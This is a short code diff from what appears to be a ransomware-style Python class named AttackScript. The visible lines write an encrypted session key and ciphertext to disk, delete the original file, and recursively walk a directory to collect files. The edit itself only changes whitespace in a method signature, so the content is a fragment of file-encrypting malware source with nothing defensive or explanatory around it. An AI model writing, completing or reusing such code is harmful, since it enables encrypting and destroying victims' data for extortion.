@@ -436,7 +436,7 @@ class AttackScript:
             [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
         remove(dataFile)
 
-    def recurseFiles(self, baseDirectory):
+    def recurseFiles(self,baseDirectory):
         # Scan a directory and return a list of all files
         for entry in scandir(baseDirectory):
             if entry.is_file():
